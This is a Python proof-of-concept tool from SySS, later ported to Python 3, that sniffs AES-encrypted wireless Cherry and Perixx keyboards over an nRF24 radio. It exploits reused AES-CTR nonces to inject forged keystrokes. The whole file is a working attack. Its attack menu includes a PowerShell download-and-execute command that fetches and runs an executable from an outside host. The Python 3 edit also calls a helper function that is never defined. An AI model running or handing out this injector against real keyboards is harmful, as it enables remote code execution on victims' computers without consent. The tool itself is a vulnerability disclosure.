#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
  Keystroke Injector

  by Matthias Deeg <matthias.deeg@syss.de>
  and Gerard Klostermeier <gerhard.klostermeier@syss.de>

  Proof-of-Concept software tool to demonstrate the keystroke injection
  vulnerability of some AES encrypted wireless keyboards

  Copyright (C) 2016 SySS GmbH

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <http://www.gnu.org/licenses/>.
  
  Einstein2150 (Update 2024):
  This program has been migrated and further developed for use with
  Python 3 by Einstein2150. The author acknowledges that ongoing
  enhancements and updates to the codebase may continue in the future.
  Users should be aware that the use of this program is at their own
  risk, and the author accepts no responsibility for any damages that
  may arise from its use. It is the user's responsibility to ensure 
  that their use of the program complies with all applicable laws 
  and regulations.
  
"""

__version__ = '0.8'
__author__ = 'Einstein2150'

import argparse
from binascii import hexlify, unhexlify
from lib import nrf24, keyboard
from time import sleep, time
import sys

SCAN_CHANNELS   = list(range(2, 84))             # channels to scan
DWELL_TIME      = 0.1                            # dwell time for each channel in seconds
SCAN_TIME       = 2                              # scan time in seconds for scan mode heuristics
KEYSTROKE_DELAY = 0.01                           # keystroke delay in seconds

# supported devices
DEVICES = {
    'cherry' : 'Cherry',
    'perixx' : 'Perixx'
}

# available attack vectors for command execution
ATTACK_VECTORS = {
        1 : ("Open calc.exe", "calc"),
        2 : ("Open cmd.exe", "cmd"),
        3 : ("Classic download & execute attack", "powershell (new-object System.Net.WebClient).DownloadFile('http://ptmd.sy.gs/syss.exe', '%TEMP%\\syss.exe'); Start-Process '%TEMP%\\syss.exe'")
}

def banner():
    """Show a fancy banner"""
    print("        _____  ______ ___  _  _     _____  _                      _  \n"
          "       |  __ \\|  ____|__ \\| || |   |  __ \\| |                    | |     \n"
          "  _ __ | |__) | |__     ) | || |_  | |__) | | __ _ _   _ ___  ___| |_       \n"
          " | '_ \\|  _  /|  __|   / /|__   _| |  ___/| |/ _` | | | / __|/ _ \\ __|    \n"
          " | | | | | \\ \\| |     / /_   | |   | |    | | (_| | |_| \\__ \\  __/ |_   \n"
          " |_| |_|_|  \\_\\_|    |____|  |_|   |_|    |_|\\__,_|\\__, |___/\\___|\\__|\n"
          "                                                    __/ |             \n"
          "                                                   |___/              \n"
        "Logitech Wireless Presenter Attack Tool v{0} by Matthias Deeg - SySS GmbH (c) 2016\n"
        "optimized for use with Python 3 by Einstein2150 (2024)\n".format(__version__))


# main program
if __name__ == '__main__':
    # show banner
    banner()

    # init argument parser
    parser = argparse.ArgumentParser()
    parser.add_argument('-a', '--address', type=str, help='Address of nRF24 device')
    parser.add_argument('-c', '--channels', type=int, nargs='+', help='ShockBurst RF channel', default=range(2, 84), metavar='N')
    parser.add_argument('-d', '--device', type=str, help='Target device (supported: cherry, perixx)', required=True)

    # parse arguments
    args = parser.parse_args()

    # set scan channels
    SCAN_CHANNELS = args.channels

    if args.address:
        try:
            # address of nRF24 keyboard (CAUTION: Reversed byte order compared to sniffer tools!)
            address = bytes.fromhex(args.address.replace(':', ''))[::-1][:5]
            address_string = ':'.join('{:02X}'.format(b) for b in address[::-1])
        except:
            print("[-] Error: Invalid address")
            sys.exit(1)
    else:
        address = b""

    try:
        # initialize radio
        print("[*] Configure nRF24 radio")
        radio = nrf24.nrf24()

        # enable LNA
        radio.enable_lna()
    except:
        print("[-] Error: Could not initialize nRF24 radio")
        sys.exit(1)

    try:
        # set keyboard
        print("[*] Set keyboard: {0}".format(DEVICES[args.device]))

        if args.device == 'cherry':
            keyboard_device = keyboard.CherryKeyboard
        elif args.device == 'perixx':
            keyboard_device = keyboard.PerixxKeyboard
    except Exception:
        print("[-] Error: Unsupported device")
        sys.exit(1)

    # put the radio in promiscuous mode with given address
    if len(address) > 0:
        radio.enter_promiscuous_mode(address[-1])
    else:
        radio.enter_promiscuous_mode()

    # set the initial channel
    radio.set_channel(SCAN_CHANNELS[0])

    # sweep through the channels and decode ESB packets in pseudo-promiscuous mode
    print("[*] Scanning for wireless keyboard ...")
    last_tune = time()
    channel_index = 0
    while True:
        # increment the channel
        if len(SCAN_CHANNELS) > 1 and time() - last_tune > DWELL_TIME:
            channel_index = (channel_index + 1) % len(SCAN_CHANNELS)
            radio.set_channel(SCAN_CHANNELS[channel_index])
            last_tune = time()

        # receive payloads
        value = radio.receive_payload()
        if len(value) >= 10:
            # split the address and payload
            address, payload = value[:5], value[5:]

            # convert address to string and reverse byte order
            address_string = ':'.join('{:02X}'.format(b) for b in address[::-1])
            print("[+] Found nRF24 device with address {0} on channel {1}".format(address_string, SCAN_CHANNELS[channel_index]))

            # ask user about device
            answer = input("[?] Attack this device (y/n)? ")
            if answer.lower().startswith('y'):
                break
            else:
                print("[*] Continue scanning ...")

    # put the radio in sniffer mode (ESB w/o auto ACKs)
    radio.enter_sniffer_mode(address[::-1])
    last_tune = time()
    channel_index = 0
    last_key = 0
    packet_count = 0

    print("[*] Search for crypto key (actually a key release packet) ...")
    while True:
        if args.device != 'cherry':
            # increment the channel
            if len(SCAN_CHANNELS) > 1 and time() - last_tune > DWELL_TIME:
                channel_index = (channel_index + 1) % len(SCAN_CHANNELS)
                radio.set_channel(SCAN_CHANNELS[channel_index])
                last_tune = time()

        # receive payload
        value = radio.receive_payload()

        if value[0] == 0:
            # do some time measurement
            last_key = time()

            # split the payload from the status byte
            payload = value[1:]

            # increment packet count
            packet_count += 1

        # heuristic for having a valid release key data packet
        if packet_count >= 4 and time() - last_key > SCAN_TIME:
            break

    print("[+] Found crypto key")

    # keystroke injection attack
    while True:
        print("[*] Please choose your attack vector (0 to quit)")
        for av in ATTACK_VECTORS:
            print("    {0}) {1}".format(av, ATTACK_VECTORS[av][0]))
        print("    0) Exit")

        try:
            answer = int(input("[?] Select keystroke injection attack: "))
            if answer == 0:
                break
            if answer in ATTACK_VECTORS:
                attack_keystrokes = ATTACK_VECTORS[answer][1]

                # keystroke injection
                print("[*] Start keystroke injection ...")

                # initialize keyboard with latest assumed key release packet to exploit AES-CTR crypto with reusable nonces
                kbd = keyboard_device(payload.tobytes().decode('utf-8'))

                # send keystrokes for chosen attack
                
                # Beispieltext, der injiziert werden soll
                inject_text = "you got hacked"

                # Initialisiere die Keystrokes
                keystrokes = []

                # Füge den injizierten Text zu den Keystrokes hinzu
                keystrokes.extend(get_keystrokes_from_text(inject_text, kbd))  # kbd ist das Keyboard-Objekt
                
                #keystrokes = []
                keystrokes.append(kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
                keystrokes.append(kbd.keyCommand(keyboard.MODIFIER_GUI_RIGHT, keyboard.KEY_R))
                keystrokes.append(kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))

                for k in keystrokes:
                    radio.transmit_payload(k)
                    sleep(KEYSTROKE_DELAY)

                sleep(0.1)

                keystrokes = kbd.getKeystrokes(attack_keystrokes)
                keystrokes += kbd.getKeystroke(keyboard.KEY_RETURN)

                for k in keystrokes:
                    radio.transmit_payload(k)
                    sleep(KEYSTROKE_DELAY)

                print("[*] Done.")
            else:
                print("[-] Invalid attack")
        except ValueError:
            print("[-] Invalid input")

    print("[*] Done with keystroke injections.\n    Have a nice day!")
